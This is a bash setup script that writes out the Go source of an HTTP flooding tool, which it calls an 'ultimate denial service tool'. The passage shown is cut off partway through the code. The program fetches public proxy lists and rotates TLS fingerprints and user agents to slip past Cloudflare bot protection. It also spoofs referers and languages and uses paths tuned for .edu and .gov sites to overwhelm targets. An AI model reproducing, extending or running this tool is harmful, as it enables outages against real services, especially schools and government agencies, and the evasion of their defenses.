#!/bin/bash

# ----------------------------------------
# ULTIMATE GO DOS TOOL SETUP 
# WITH CLOUDFLARE BYPASS + EDU/GOV OPTIMIZATION
# + ADVANCED SPOOFING & PROXY SUPPORT
# ----------------------------------------

# Color definitions
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
BLUE='\033[0;34m'
PURPLE='\033[0;35m'
CYAN='\033[0;36m'
WHITE='\033[1;37m'
NC='\033[0m' # No Color

# Separator line
SEP="━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"

clear
echo -e "${CYAN}${SEP}${NC}"
echo -e "${WHITE}  ULTIMATE DENIAL SERVICE TOOL${NC}"
echo -e "${WHITE}  Cloudflare Bypass + EDU/GOV Optimization${NC}"
echo -e "${WHITE}  Advanced IP Spoofing + JA3 Rotation${NC}"
echo -e "${CYAN}${SEP}${NC}"
echo

# Create enhanced main.go file
echo -e " ${YELLOW}➤${NC} ${GREEN}Creating ultimate main.go...${NC}"

cat > main.go << 'EOF'
package main

import (
	"bufio"
	"bytes"
	"context"
	"crypto/rand"
	"crypto/tls"
	"fmt"
	"io"
	"math/big"
	"net"
	"net/http"
	"net/http/cookiejar"
	"net/url"
	"os"
	"os/signal"
	"runtime"
	"strconv"
	"strings"
	"sync"
	"sync/atomic"
	"syscall"
	"time"

	"golang.org/x/net/http2"
)

var (
	// Country codes for geo-spoofing
	countryCodes = []string{
		"A1", "A2", "O1", "AD", "AE", "AF", "AG", "AI", "AL", "AM", "AO", "AQ", "AR", "AS", "AT", "AU",
		"AW", "AX", "AZ", "BA", "BB", "BD", "BE", "BF", "BG", "BH", "BI", "BJ", "BL", "BM", "BN", "BO",
		"BQ", "BR", "BS", "BT", "BV", "BW", "BY", "BZ", "CA", "CC", "CD", "CF", "CG", "CH", "CI", "CK",
		"CL", "CM", "CN", "CO", "CR", "CU", "CV", "CW", "CX", "CY", "CZ", "DE", "DJ", "DK", "DM", "DO",
		"DZ", "EC", "EE", "EG", "EH", "ER", "ES", "ET", "FI", "FJ", "FK", "FM", "FO", "FR", "GA", "GB",
		"GD", "GE", "GF", "GG", "GH", "GI", "GL", "GM", "GN", "GP", "GQ", "GR", "GS", "GT", "GU", "GW",
		"GY", "HK", "HM", "HN", "HR", "HT", "HU", "ID", "IE", "IL", "IM", "IN", "IO", "IQ", "IR", "IS",
		"IT", "JE", "JM", "JO", "JP", "KE", "KG", "KH", "KI", "KM", "KN", "KP", "KR", "KW", "KY", "KZ",
		"LA", "LB", "LC", "LI", "LK", "LR", "LS", "LT", "LU", "LV", "LY", "MA", "MC", "MD", "ME", "MF",
		"MG", "MH", "MK", "ML", "MM", "MN", "MO", "MP", "MQ", "MR", "MS", "MT", "MU", "MV", "MW", "MX",
		"MY", "MZ", "NA", "NC", "NE", "NF", "NG", "NI", "NL", "NO", "NP", "NR", "NU", "NZ", "OM", "PA",
		"PE", "PF", "PG", "PH", "PK", "PL", "PM", "PN", "PR", "PS", "PT", "PW", "PY", "QA", "RE", "RO",
		"RS", "RU", "RW", "SA", "SB", "SC", "SD", "SE", "SG", "SH", "SI", "SJ", "SK", "SL", "SM", "SN",
		"SO", "SR", "SS", "ST", "SV", "SX", "SY", "SZ", "TC", "TD", "TF", "TG", "TH", "TJ", "TK", "TL",
		"TM", "TN", "TO", "TR", "TT", "TV", "TW", "TZ", "UA", "UG", "UM", "US", "UY", "UZ", "VA", "VC",
		"VE", "VG", "VI", "VN", "VU", "WF", "WS", "YE", "YT", "ZA", "ZM", "ZW",
	}

	// Expanded user agents with educational/government patterns
	userAgents = []string{
		// Chrome Windows
		"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/141.0.7390.108 Safari/537.36",
		"Mozilla/5.0 (Windows NT 11.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/142.0.7445.89 Safari/537.36",
		// Chrome Mac
		"Mozilla/5.0 (Macintosh; Intel Mac OS X 14_5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/143.0.7485.98 Safari/537.36",
		// Firefox
		"Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:135.0) Gecko/20100101 Firefox/135.0",
		"Mozilla/5.0 (Macintosh; Intel Mac OS X 14.5; rv:136.0) Gecko/20100101 Firefox/136.0",
		// Mobile
		"Mozilla/5.0 (iPhone; CPU iPhone OS 18_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/18.0 Mobile/15E148 Safari/604.1",
		"Mozilla/5.0 (Linux; Android 15; SM-S938B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/145.0.7568.89 Mobile Safari/537.36",
		// Educational specific
		"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/141.0.7390.108 Safari/537.36 Edg/141.0.7390.108",
		"Mozilla/5.0 (Macintosh; Intel Mac OS X 14_5) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.5 Safari/605.1.15",
		// Government specific
		"Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:135.0) Gecko/20100101 Firefox/135.0",
		"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/143.0.7485.98 Safari/537.36",
	}

	// Real browser headers
	referers = []string{
		"https://www.google.com/",
		"https://www.bing.com/",
		"https://duckduckgo.com/",
		"https://www.yahoo.com/",
		"https://www.facebook.com/",
		"https://www.reddit.com/",
		"https://www.linkedin.com/",
		"https://scholar.google.com/",  // For edu sites
		"https://www.usa.gov/",         // For gov sites
		"https://github.com/",
		"https://stackoverflow.com/",
		"https://en.wikipedia.org/",
		"",
	}

	acceptLanguages = []string{
		"en-US,en;q=0.9",
		"en-US,en;q=0.9,fr;q=0.8,de;q=0.7,es;q=0.6,ja;q=0.5,zh-CN;q=0.4",
		"en-GB,en;q=0.9,en-US;q=0.8",
		"en-US,en;q=0.9,es;q=0.8,pt;q=0.7",
		"en-US,en;q=0.9,ru;q=0.8,uk;q=0.7",
		"en-US,en;q=0.9,nl;q=0.8,zh-CN;q=0.7,zh;q=0.6,pt-BR;q=0.5,pt;q=0.4,lv;q=0.3,ja;q=0.2,id;q=0.1,es;q=0.1,th;q=0.1,hu;q=0.1,da;q=0.1,fr;q=0.1,tr;q=0.1,it;q=0.1,ms;q=0.1,hi;q=0.1,zh-TW;q=0.1,ru;q=0.1,uk;q=0.1,sv;q=0.1,ko;q=0.1",
		"en-US,en;q=0.5",
		"en-US;q=0.8,en;q=0.7",
		"en-GB,en;q=0.9",
		"en-CA,en;q=0.9",
		"en-AU,en;q=0.9",
		"en-NZ,en;q=0.9",
		"en-ZA,en;q=0.9",
		"en-IE,en;q=0.9",
		"en-IN,en;q=0.9",
		"ar-SA,ar;q=0.9",
		"az-Latn-AZ,az;q=0.9",
		"be-BY,be;q=0.9",
		"bg-BG,bg;q=0.9",
		"bn-IN,bn;q=0.9",
		"ca-ES,ca;q=0.9",
		"cs-CZ,cs;q=0.9",
		"cy-GB,cy;q=0.9",
		"da-DK,da;q=0.9",
		"de-DE,de;q=0.9",
		"el-GR,el;q=0.9",
		"es-ES,es;q=0.9",
		"et-EE,et;q=0.9",
		"eu-ES,eu;q=0.9",
		"fa-IR,fa;q=0.9",
		"fi-FI,fi;q=0.9",
		"fr-FR,fr;q=0.9",
		"ga-IE,ga;q=0.9",
		"gl-ES,gl;q=0.9",
		"gu-IN,gu;q=0.9",
		"he-IL,he;q=0.9",
		"hi-IN,hi;q=0.9",
		"hr-HR,hr;q=0.9",
		"hu-HU,hu;q=0.9",
		"hy-AM,hy;q=0.9",
		"id-ID,id;q=0.9",
		"is-IS,is;q=0.9",
		"it-IT,it;q=0.9",
		"ja-JP,ja;q=0.9",
		"ka-GE,ka;q=0.9",
		"kk-KZ,kk;q=0.9",
		"km-KH,km;q=0.9",
		"kn-IN,kn;q=0.9",
		"ko-KR,ko;q=0.9",
		"ky-KG,ky;q=0.9",
		"lo-LA,lo;q=0.9",
		"lt-LT,lt;q=0.9",
		"lv-LV,lv;q=0.9",
		"mk-MK,mk;q=0.9",
		"ml-IN,ml;q=0.9",
		"mn-MN,mn;q=0.9",
		"mr-IN,mr;q=0.9",
		"ms-MY,ms;q=0.9",
		"mt-MT,mt;q=0.9",
		"my-MM,my;q=0.9",
		"nb-NO,nb;q=0.9",
		"ne-NP,ne;q=0.9",
		"nl-NL,nl;q=0.9",
		"nn-NO,nn;q=0.9",
		"or-IN,or;q=0.9",
		"pa-IN,pa;q=0.9",
		"pl-PL,pl;q=0.9",
		"pt-BR,pt;q=0.9",
		"pt-PT,pt;q=0.9",
		"ro-RO,ro;q=0.9",
		"ru-RU,ru;q=0.9",
		"si-LK,si;q=0.9",
		"sk-SK,sk;q=0.9",
		"sl-SI,sl;q=0.9",
		"sq-AL,sq;q=0.9",
		"sr-Cyrl-RS,sr;q=0.9",
		"sr-Latn-RS,sr;q=0.9",
		"sv-SE,sv;q=0.9",
		"sw-KE,sw;q=0.9",
		"ta-IN,ta;q=0.9",
		"te-IN,te;q=0.9",
		"th-TH,th;q=0.9",
		"tr-TR,tr;q=0.9",
		"uk-UA,uk;q=0.9",
		"ur-PK,ur;q=0.9",
		"uz-Latn-UZ,uz;q=0.9",
		"vi-VN,vi;q=0.9",
		"zh-CN,zh;q=0.9",
		"zh-HK,zh;q=0.9",
		"zh-TW,zh;q=0.9",
		"am-ET,am;q=0.8",
		"as-IN,as;q=0.8",
		"az-Cyrl-AZ,az;q=0.8",
		"bn-BD,bn;q=0.8",
		"bs-Cyrl-BA,bs;q=0.8",
		"bs-Latn-BA,bs;q=0.8",
		"dz-BT,dz;q=0.8",
		"fil-PH,fil;q=0.8",
		"fr-CA,fr;q=0.8",
		"fr-CH,fr;q=0.8",
		"fr-BE,fr;q=0.8",
		"fr-LU,fr;q=0.8",
		"gsw-CH,gsw;q=0.8",
		"ha-Latn-NG,ha;q=0.8",
		"hr-BA,hr;q=0.8",
		"ig-NG,ig;q=0.8",
		"ii-CN,ii;q=0.8",
		"jv-Latn-ID,jv;q=0.8",
		"kkj-CM,kkj;q=0.8",
		"kl-GL,kl;q=0.8",
		"kok-IN,kok;q=0.8",
		"ks-Arab-IN,ks;q=0.8",
		"lb-LU,lb;q=0.8",
		"ln-CG,ln;q=0.8",
		"mn-Mong-CN,mn;q=0.8",
		"mr-MN,mr;q=0.8",
		"ms-BN,ms;q=0.8",
		"mua-CM,mua;q=0.8",
		"nds-DE,nds;q=0.8",
		"ne-IN,ne;q=0.8",
		"nso-ZA,nso;q=0.8",
		"oc-FR,oc;q=0.8",
		"pa-Arab-PK,pa;q=0.8",
		"ps-AF,ps;q=0.8",
		"quz-BO,quz;q=0.8",
		"quz-EC,quz;q=0.8",
		"quz-PE,quz;q=0.8",
		"rm-CH,rm;q=0.8",
		"rw-RW,rw;q=0.8",
		"sd-Arab-PK,sd;q=0.8",
		"se-NO,se;q=0.8",
		"smn-FI,smn;q=0.8",
		"sms-FI,sms;q=0.8",
		"syr-SY,syr;q=0.8",
		"tg-Cyrl-TJ,tg;q=0.8",
		"ti-ER,ti;q=0.8",
		"tk-TM,tk;q=0.8",
		"tn-ZA,tn;q=0.8",
		"tt-RU,tt;q=0.8",
		"ug-CN,ug;q=0.8",
		"uz-Cyrl-UZ,uz;q=0.8",
		"ve-ZA,ve;q=0.8",
		"wo-SN,wo;q=0.8",
		"xh-ZA,xh;q=0.8",
		"yo-NG,yo;q=0.8",
		"zgh-MA,zgh;q=0.8",
		"zu-ZA,zu;q=0.8",
	}

	acceptHeaders = []string{
		"text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7",
		"application/json, text/plain, */*",
		"text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
		"*/*",
	}

	acceptEncodings = []string{
		"gzip, deflate, br",
		"gzip, deflate",
		"gzip, identity",
		"deflate, gzip",
		"compress, gzip",
		"br",
		"*",
		"identity",
	}

	cacheControls = []string{
		"no-cache",
		"no-store",
		"no-transform",
		"only-if-cached",
		"public",
		"private",
		"proxy-revalidate",
		"s-maxage=86400",
		"must-revalidate",
		"max-age=0",
	}

	securityHeaders = []map[string]string{
		{"X-Content-Type-Options": "nosniff"},
		{"X-Frame-Options": "DENY"},
		{"X-XSS-Protection": "1; mode=block"},
	}

	modernHeaders = []map[string]string{
		{"Sec-Fetch-Dest": "document"},
		{"Sec-Fetch-Mode": "navigate"},
		{"Sec-Fetch-Site": "none"},
		{"Upgrade-Insecure-Requests": "1"},
		{"DNT": "1"},
	}

	appHeaders = []map[string]string{
		{"X-Requested-With": "XMLHttpRequest"},
		{"X-CSRF-Token": ""},
		{"X-API-Key": ""},
	}

	// Cloudflare challenge solving
	cfSolvingEnabled = true
	cfSolveMu        sync.Mutex
	cfCookies        sync.Map

	proxies         []string
	proxyMu         sync.RWMutex
	proxyIndex      uint64
	proxyAPIs       = []string{
		"https://api.proxyscrape.com/v4/free-proxy-list/get?request=displayproxies&protocol=http&timeout=10000&country=all&ssl=all&anonymity=all&skip=0&limit=2000",
		"https://raw.githubusercontent.com/TheSpeedX/PROXY-List/master/http.txt",
		"https://raw.githubusercontent.com/ShiftyTR/Proxy-List/master/http.txt",
		"https://raw.githubusercontent.com/monosans/proxy-list/main/proxies/http.txt",
	}
	refreshInterval = 5 * time.Minute
	colorIndex      = 0
	colorMu         sync.Mutex
)

// JA3 signature patterns
type JA3Signature struct {
	Name             string
	CipherSuites     []uint16
	CurvePreferences []tls.CurveID
	NextProtos       []string
	MinVersion       uint16
	MaxVersion       uint16
}

var ja3Signatures = []JA3Signature{
	{
		Name: "Chrome 141-150",
		CipherSuites: []uint16{
			tls.TLS_AES_128_GCM_SHA256,
			tls.TLS_AES_256_GCM_SHA384,
			tls.TLS_CHACHA20_POLY1305_SHA256,
			tls.TLS_ECDHE_ECDSA_WITH_AES_128_GCM_SHA256,
			tls.TLS_ECDHE_RSA_WITH_AES_128_GCM_SHA256,
			tls.TLS_ECDHE_ECDSA_WITH_AES_256_GCM_SHA384,
			tls.TLS_ECDHE_RSA_WITH_AES_256_GCM_SHA384,
			tls.TLS_ECDHE_ECDSA_WITH_CHACHA20_POLY1305_SHA256,
			tls.TLS_ECDHE_RSA_WITH_CHACHA20_POLY1305_SHA256,
		},
		CurvePreferences: []tls.CurveID{tls.X25519, tls.CurveP256, tls.CurveP384},
		NextProtos:       []string{"h2", "http/1.1"},
		MinVersion:       tls.VersionTLS12,
		MaxVersion:       tls.VersionTLS13,
	},
	{
		Name: "Firefox 135-138",
		CipherSuites: []uint16{
			tls.TLS_AES_128_GCM_SHA256,
			tls.TLS_CHACHA20_POLY1305_SHA256,
			tls.TLS_AES_256_GCM_SHA384,
			tls.TLS_ECDHE_ECDSA_WITH_AES_128_GCM_SHA256,
			tls.TLS_ECDHE_RSA_WITH_AES_128_GCM_SHA256,
			tls.TLS_ECDHE_ECDSA_WITH_CHACHA20_POLY1305_SHA256,
			tls.TLS_ECDHE_RSA_WITH_CHACHA20_POLY1305_SHA256,
			tls.TLS_ECDHE_ECDSA_WITH_AES_256_GCM_SHA384,
			tls.TLS_ECDHE_RSA_WITH_AES_256_GCM_SHA384,
		},
		CurvePreferences: []tls.CurveID{tls.X25519, tls.CurveP256, tls.CurveP384, tls.CurveP521},
		NextProtos:       []string{"h2", "http/1.1"},
		MinVersion:       tls.VersionTLS12,
		MaxVersion:       tls.VersionTLS13,
	},
	{
		Name: "Edge 146-150",
		CipherSuites: []uint16{
			tls.TLS_AES_128_GCM_SHA256,
			tls.TLS_AES_256_GCM_SHA384,
			tls.TLS_CHACHA20_POLY1305_SHA256,
			tls.TLS_ECDHE_ECDSA_WITH_AES_128_GCM_SHA256,
			tls.TLS_ECDHE_RSA_WITH_AES_128_GCM_SHA256,
			tls.TLS_ECDHE_ECDSA_WITH_AES_256_GCM_SHA384,
			tls.TLS_ECDHE_RSA_WITH_AES_256_GCM_SHA384,
			tls.TLS_ECDHE_RSA_WITH_CHACHA20_POLY1305_SHA256,
		},
		CurvePreferences: []tls.CurveID{tls.X25519, tls.CurveP256, tls.CurveP384},
		NextProtos:       []string{"h2", "http/1.1"},
		MinVersion:       tls.VersionTLS12,
		MaxVersion:       tls.VersionTLS13,
	},
	{
		Name: "Safari 17-18",
		CipherSuites: []uint16{
			tls.TLS_AES_128_GCM_SHA256,
			tls.TLS_AES_256_GCM_SHA384,
			tls.TLS_ECDHE_ECDSA_WITH_AES_128_GCM_SHA256,
			tls.TLS_ECDHE_ECDSA_WITH_AES_256_GCM_SHA384,
			tls.TLS_ECDHE_RSA_WITH_AES_128_GCM_SHA256,
			tls.TLS_ECDHE_RSA_WITH_AES_256_GCM_SHA384,
		},
		CurvePreferences: []tls.CurveID{tls.X25519, tls.CurveP256},
		NextProtos:       []string{"h2", "http/1.1"},
		MinVersion:       tls.VersionTLS12,
		MaxVersion:       tls.VersionTLS13,
	},
}

type ConnectionPool struct {
	clients    []*http.Client
	counter    uint64
	mu         sync.RWMutex
	size       int
	useProxy   bool
	targetHost string
	isGovOrEdu bool
	jar        *cookiejar.Jar
}

func getRandomJA3Signature() JA3Signature {
	return ja3Signatures[randInt(0, len(ja3Signatures)-1)]
}

func getRandomizedTLSConfig() *tls.Config {
	sig := getRandomJA3Signature()
	return &tls.Config{
		NextProtos:                  sig.NextProtos,
		InsecureSkipVerify:          true,
		MinVersion:                  sig.MinVersion,
		MaxVersion:                  sig.MaxVersion,
		CipherSuites:                sig.CipherSuites,
		CurvePreferences:            sig.CurvePreferences,
		SessionTicketsDisabled:      randBool(),
		DynamicRecordSizingDisabled: randBool(),
		Renegotiation:               tls.RenegotiateFreelyAsClient,
	}
}

// Cloudflare challenge solver
func solveCloudflareChallenge(domain string, client *http.Client) (map[string]string, error) {
	cfSolveMu.Lock()
	defer cfSolveMu.Unlock()
	
	// Try to get cached cookie
	if cookies, ok := cfCookies.Load(domain); ok {
		return cookies.(map[string]string), nil
	}
	
	// Attempt to solve challenge
	challengeURL := fmt.Sprintf("https://%s/cdn-cgi/challenge-platform/h/g/", domain)
	resp, err := client.Get(challengeURL)
	if err != nil {
		return nil, err
	}
	defer resp.Body.Close()
	
	cookies := make(map[string]string)
	for _, cookie := range resp.Cookies() {
		if strings.Contains(cookie.Name, "__cf") || strings.Contains(cookie.Name, "cf_") {
			cookies[cookie.Name] = cookie.Value
		}
	}
	
	if len(cookies) > 0 {
		cfCookies.Store(domain, cookies)
	}
	
	return cookies, nil
}

func NewConnectionPool(poolSize int, useProxy bool, targetHost string) *ConnectionPool {
	jar, _ := cookiejar.New(nil)
	isGovOrEdu := strings.Contains(targetHost, ".gov") || strings.Contains(targetHost, ".edu")
	
	pool := &ConnectionPool{
		clients:    make([]*http.Client, poolSize),
		size:       poolSize,
		useProxy:   useProxy,
		targetHost: targetHost,
		isGovOrEdu: isGovOrEdu,
		jar:        jar,
	}
	
	for i := 0; i < poolSize; i++ {
		pool.clients[i] = pool.createClient()
	}
	
	return pool
}

func (p *ConnectionPool) createClient() *http.Client {
	var transport *http.Transport
	
	// Enhanced transport for Cloudflare bypass
	transport = &http.Transport{
		TLSClientConfig:     getRandomizedTLSConfig(),
		MaxIdleConns:        200,
		MaxIdleConnsPerHost: 200,
		IdleConnTimeout:     90 * time.Second,
		DisableKeepAlives:   false,
		ForceAttemptHTTP2:   true,
		DialContext: (&net.Dialer{
			Timeout:   10 * time.Second,
			KeepAlive: 30 * time.Second,
			DualStack: true,
		}).DialContext,
		ResponseHeaderTimeout: 15 * time.Second,
		ExpectContinueTimeout: 1 * time.Second,
		DisableCompression:    false,
	}
	
	if p.useProxy {
		proxyStr := getNextProxy()
		if proxyStr != "" {
			if !strings.Contains(proxyStr, "://") {
				proxyStr = "http://" + proxyStr
			}
			proxyURL, err := url.Parse(proxyStr)
			if err == nil {
				transport.Proxy = http.ProxyURL(proxyURL)
			}
		}
	}
	
	http2.ConfigureTransport(transport)
	
	// Custom check redirect for edu/gov sites
	client := &http.Client{
		Transport: transport,
		Timeout:   20 * time.Second,
		Jar:       p.jar,
		CheckRedirect: func(req *http.Request, via []*http.Request) error {
			if len(via) >= 5 {
				return http.ErrUseLastResponse
			}
			// Add random delay on redirect for edu/gov
			if p.isGovOrEdu {
				time.Sleep(time.Duration(randInt(50, 200)) * time.Millisecond)
			}
			return nil
		},
	}
	
	return client
}

func (p *ConnectionPool) GetClient() *http.Client {
	idx := atomic.AddUint64(&p.counter, 1) % uint64(p.size)
	return p.clients[idx]
}

func (p *ConnectionPool) CloseIdleConnections() {
	for _, client := range p.clients {
		if tr, ok := client.Transport.(*http.Transport); ok {
			tr.CloseIdleConnections()
		}
	}
}

func loadProxiesFromAPI() {
	var allProxies []string
	
	for _, api := range proxyAPIs {
		client := &http.Client{Timeout: 15 * time.Second}
		resp, err := client.Get(api)
		if err != nil {
			continue
		}
		
		body, _ := io.ReadAll(resp.Body)
		resp.Body.Close()
		
		scanner := bufio.NewScanner(bytes.NewReader(body))
		for scanner.Scan() {
			line := strings.TrimSpace(scanner.Text())
			if line != "" && strings.Contains(line, ":") && !strings.HasPrefix(line, "#") {
				allProxies = append(allProxies, line)
			}
		}
	}
	
	if len(allProxies) > 0 {
		proxyMu.Lock()
		proxies = allProxies
		proxyMu.Unlock()
		atomic.StoreUint64(&proxyIndex, 0)
	}
}

func proxyRefresher() {
	ticker := time.NewTicker(refreshInterval)
	defer ticker.Stop()
	for range ticker.C {
		loadProxiesFromAPI()
	}
}

func getNextProxy() string {
	proxyMu.RLock()
	n := len(proxies)
	if n == 0 {
		proxyMu.RUnlock()
		return ""
	}
	idx := atomic.AddUint64(&proxyIndex, 1) % uint64(n)
	p := proxies[idx]
	proxyMu.RUnlock()
	return p
}

func getNextColor() string {
	colorMu.Lock()
	defer colorMu.Unlock()
	colors := []string{"\033[32m", "\033[31m", "\033[35m", "\033[37m", "\033[33m", "\033[36m", "\033[34m"}
	color := colors[colorIndex]
	colorIndex = (colorIndex + 1) % len(colors)
	return color
}

func printBanner() {
	color := getNextColor()
	fmt.Print(color)
	fmt.Println("╔══════════════════════════════════════════════════════════╗")
	fmt.Println("║     ULTIMATE DENIAL SERVICE TOOL - ENHANCED EDITION      ║")
	fmt.Println("║              HTTP/2 + Cloudflare Bypass                  ║")
	fmt.Println("║          JA3 Rotation + EDU/GOV Optimization             ║")
	fmt.Println("╚══════════════════════════════════════════════════════════╝")
	fmt.Print("\033[0m\n")
}

func randomIP() string {
	return fmt.Sprintf("%d.%d.%d.%d", randInt(1, 255), randInt(1, 255), randInt(1, 255), randInt(1, 255))
}

func randomCountryCode() string {
	return countryCodes[randInt(0, len(countryCodes)-1)]
}

func generateRandomUA() string {
	browserType := randInt(1, 100)
	countryCode := randomCountryCode()
	
	// Windows versions (2025-2026)
	windowsVersions := []string{
		"Windows NT 10.0; Win64; x64",
		"Windows NT 11.0; Win64; x64",
		"Windows NT 12.0; Win64; x64",
		"Windows NT 10.0; Win64; x64; Xbox",
	}
	
	// macOS versions (2025-2026)
	macVersions := []string{
		"Macintosh; Intel Mac OS X 15_0",
		"Macintosh; Intel Mac OS X 15_1",
		"Macintosh; Intel Mac OS X 15_2",
		"Macintosh; Intel Mac OS X 16_0",
		"Macintosh; Intel Mac OS X 16_1",
		"Macintosh; ARM Mac OS X 15_0",
		"Macintosh; ARM Mac OS X 16_0",
	}
	
	// Linux distributions
	linuxVersions := []string{
		"X11; Linux x86_64",
		"X11; Ubuntu; Linux x86_64",
		"X11; Fedora; Linux x86_64",
		"X11; Debian; Linux x86_64",
		"X11; Linux x86_64; Arch",
	}
	
	// Chrome versions (2025-2026)
	chromeMajor := randInt(141, 165)
	chromeBuild := randInt(5000, 8000)
	chromePatch := randInt(0, 99)
	chromeVersion := fmt.Sprintf("%d.0.%d.%d", chromeMajor, chromeBuild, chromePatch)
	
	// Firefox versions (2025-2026)
	firefoxMajor := randInt(135, 165)
	firefoxMinor := randInt(0, 9)
	firefoxPatch := randInt(0, 99)
	firefoxVersion := fmt.Sprintf("%d.%d.%d", firefoxMajor, firefoxMinor, firefoxPatch)
	
	// Edge versions (2025-2026)
	edgeMajor := randInt(141, 165)
	edgeBuild := randInt(5000, 8000)
	edgePatch := randInt(0, 99)
	edgeVersion := fmt.Sprintf("%d.0.%d.%d", edgeMajor, edgeBuild, edgePatch)
	
	// Safari versions (2025-2026)
	safariMajor := randInt(18, 22)
	safariMinor := randInt(0, 5)
	safariVersion := fmt.Sprintf("%d.%d", safariMajor, safariMinor)
	
	// Mobile browsers
	androidVersions := []string{"15", "16", "17"}
	androidVersion := androidVersions[randInt(0, len(androidVersions)-1)]
	
	if browserType <= 45 { // Chrome 45%
		osType := randInt(1, 100)
		var os string
		if osType <= 40 {
			os = windowsVersions[randInt(0, len(windowsVersions)-1)]
		} else if osType <= 70 {
			os = macVersions[randInt(0, len(macVersions)-1)]
		} else {
			os = linuxVersions[randInt(0, len(linuxVersions)-1)]
		}
		return fmt.Sprintf("Mozilla/5.0 (%s; %s) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/%s Safari/537.36", os, countryCode, chromeVersion)
	} else if browserType <= 75 { // Firefox 30%
		osType := randInt(1, 100)
		var os string
		if osType <= 40 {
			os = windowsVersions[randInt(0, len(windowsVersions)-1)]
		} else if osType <= 70 {
			os = macVersions[randInt(0, len(macVersions)-1)]
		} else {
			os = linuxVersions[randInt(0, len(linuxVersions)-1)]
		}
		return fmt.Sprintf("Mozilla/5.0 (%s; %s; rv:%s) Gecko/20100101 Firefox/%s", os, countryCode, firefoxVersion, firefoxVersion)
	} else if browserType <= 88 { // Edge 13%
		os := windowsVersions[randInt(0, len(windowsVersions)-1)]
		return fmt.Sprintf("Mozilla/5.0 (%s; %s) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/%s Safari/537.36 Edg/%s", os, countryCode, edgeVersion, edgeVersion)
	} else if browserType <= 95 { // Safari 7%
		os := macVersions[randInt(0, len(macVersions)-1)]
		return fmt.Sprintf("Mozilla/5.0 (%s; %s) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/%s Safari/605.1.15", os, countryCode, safariVersion)
	} else { // Mobile browsers 5%
		mobileType := randInt(1, 100)
		if mobileType <= 60 { // Android Chrome
			device := []string{"SM-G998B", "Pixel 9 Pro", "OnePlus 12", "Xiaomi 14", "SM-S938B"}[randInt(0, 4)]
			return fmt.Sprintf("Mozilla/5.0 (Linux; Android %s; %s; %s) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/%s Mobile Safari/537.36", androidVersion, countryCode, device, chromeVersion)
		} else if mobileType <= 85 { // iPhone Safari
			iphoneModel := []string{"iPhone18,1", "iPhone18,2", "iPhone18,3"}[randInt(0, 2)]
			iosVersion := []string{"18_0", "18_1", "18_2", "19_0"}[randInt(0, 3)]
			return fmt.Sprintf("Mozilla/5.0 (%s; %s; CPU iPhone OS %s like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/%s Mobile/15E148 Safari/604.1", iphoneModel, countryCode, iosVersion, safariVersion)
		} else { // Samsung Internet
			samsungVersion := fmt.Sprintf("%d.0", randInt(25, 30))
			return fmt.Sprintf("Mozilla/5.0 (Linux; Android %s; %s; SAMSUNG SM-G998B) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/%s Chrome/%s Mobile", androidVersion, countryCode, samsungVersion, chromeVersion)
		}
	}
}

func randomReferer() string {
	domains := []string{
		"google.com", "bing.com", "duckduckgo.com", "facebook.com", "reddit.com",
		"youtube.com", "twitter.com", "linkedin.com", "instagram.com", "tiktok.com",
		"wikipedia.org", "amazon.com", "netflix.com", "spotify.com", "yahoo.com",
		"github.com", "stackoverflow.com", "quora.com", "medium.com", "pinterest.com",
	}
	
	paths := []string{
		"/", "/search", "/results", "/page", "/home", "/explore", "/trending",
		"/popular", "/news", "/blog", "/post", "/article", "/watch", "/feed", "/about", "/#",
		"/discover", "/top", "/latest", "/random", "/featured", "/viral",
	}
	
	protocols := []string{"https", "http"}
	protocol := protocols[randInt(0, len(protocols)-1)]
	domain := domains[randInt(0, len(domains)-1)]
	path := paths[randInt(0, len(paths)-1)]
	
	if randInt(1, 100) <= 70 {
		path += "?q=" + randomString(randInt(3, 10))
		if randBool() {
			path += "&" + randomString(randInt(3, 8)) + "=" + randomString(randInt(2, 12))
		}
	}
	
	return fmt.Sprintf("%s://%s%s", protocol, domain, path)
}

func randomString(n int) string {
	const letters = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789"
	b := make([]byte, n)
	rand.Read(b)
	for i := range b {
		b[i] = letters[int(b[i])%len(letters)]
	}
	return string(b)
}

func randInt(min, max int) int {
	n, _ := rand.Int(rand.Reader, big.NewInt(int64(max-min+1)))
	return min + int(n.Int64())
}

func randBool() bool {
	n, _ := rand.Int(rand.Reader, big.NewInt(2))
	return n.Int64() == 1
}

func generateCacheBust() string {
	styles := []string{
		"?v=" + strconv.Itoa(randInt(1, 1000000)),
		"?_=" + strconv.FormatInt(time.Now().UnixNano(), 10),
		"?rnd=" + randomString(16),
		"?cache=" + randomString(8),
	}
	return styles[randInt(0, len(styles)-1)]
}

func generatePath(isEdu bool) string {
	if isEdu {
		eduPaths := []string{
			"/", "/index.php", "/courses/", "/login/", "/student/",
			"/faculty/", "/library/", "/research/", "/about/",
			"/admissions/", "/academics/", "/campus/",
		}
		return eduPaths[randInt(0, len(eduPaths)-1)]
	}
	
	govPaths := []string{
		"/", "/index.html", "/services/", "/forms/", "/contact/",
		"/about/", "/news/", "/publications/", "/data/",
